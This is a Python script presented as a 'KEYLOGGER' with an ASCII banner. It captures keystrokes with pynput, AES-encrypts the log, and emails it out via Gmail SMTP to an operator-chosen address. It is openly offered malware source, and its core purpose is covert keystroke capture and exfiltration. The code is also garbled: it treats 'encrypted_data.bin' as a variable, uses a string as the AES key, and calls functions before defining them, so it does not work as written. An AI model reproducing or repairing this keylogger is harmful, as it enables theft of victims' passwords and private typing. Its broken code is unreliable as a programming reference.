#! /usr/bin/python3

#Imports
import getpass
import smtplib
import Cryptodome
from pynput.keyboard import Key, Listener
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key_location = input('Enter the location that you want your key to be stored: ') #Location of our AES key !CHANGE THIS!


# Logo
print ("""================================================================""")
print (r"""
 _   __ _____ __   __ _      _____  _____  _____  _____ ______ 
| | / /|  ___|\ \ / /| |    |  _  ||  __ \|  __ \|  ___|| ___ \
| |/ / | |__   \ V / | |    | | | || |  \/| |  \/| |__  | |_/ /
|    \ |  __|   \ /  | |    | | | || | __ | | __ |  __| |    / 
| |\  \| |___   | |  | |____\ \_/ /| |_\ \| |_\ \| |___ | |\ \ 
\_| \_/\____/   \_/  \_____/ \___/  \____/ \____/\____/ \_| \_|
                                                             """)
print ("""================================================================""")
print(""" By: CTC """)

#Asks user for input, then sets up a mail account to send the input to
#Resource from: https://realpython.com/python-send-email/
email = input('Enter Your Email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

#building the keylogger
data_to_be_encrypted = ''
full_log = ''
word = ''
email_char_lim = 100

def on_press(key):
    global word
    global full_log
    global email
    global email_char_lim
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
    if len(full_log) >= email_char_lim:
            data_to_be_encrypted
            full_log = ''
    elif key == Key.shift_1 or key == Key.shift_r:
           return
    elif key == Key.backspace:
      word = word[:-1]
    else:
       char = f'{key}'
       char = char[1:-1]
       word += char
   
    if key == Key.esc:
     return False

#Encryption function

# Generates the key
key = get_random_bytes(32)

# Saves the key to a file
file_out = open(key_location, "wb") # wb = write bytes
file_out.write(key)
file_out.close()


file_in = open(key_location, "rb") # Read bytes
key_from_file = file_in.read() # This key should be the same
file_in.close()


output_file = 'encrypted_data.bin'
data = 'data_to_be_encrypted'
key = 'file_out'

cipher = AES.new(key, AES.MODE_CFB) # CFB mode
ciphered_data = cipher.encrypt(data) # Only need to encrypt the data, no padding required for this mode

file_out = open(output_file, "wb")
file_out.write(cipher.iv)
file_out.write(ciphered_data)
file_out.close()

#Resets the data and sends it to the mail
if len(encrypted_data.bin) >= email_char_lim:
    send_log()
    data_to_be_encrypted = ''
    encrypted_data.bin = ''

#Defines the send_log function 
def send_log():
    server.sendmail(
          email,
          email,
          encrypted_data.bin
     )

with Listener( on_press=on_press ) as listener:
     listener.join
